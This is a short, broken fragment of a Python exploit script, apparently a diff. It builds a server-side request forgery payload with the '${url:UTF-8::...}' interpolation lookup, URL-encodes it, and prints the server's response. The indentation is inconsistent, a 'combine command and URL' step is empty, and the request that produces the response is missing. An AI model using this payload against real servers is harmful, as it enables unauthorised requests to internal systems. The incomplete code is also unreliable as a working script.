         exit(1)
 
     # Payload creation & encoding
    ssrf = f"${{url:UTF-8::{args.ssrf}}}"
     ssrf_encoded = urllib.parse.quote(ssrf)
 
     # Combine command and URL
 
 # Print response
 print("Response status code:", response.status_code)
print("Response body:", response.text)
\ No newline at end of file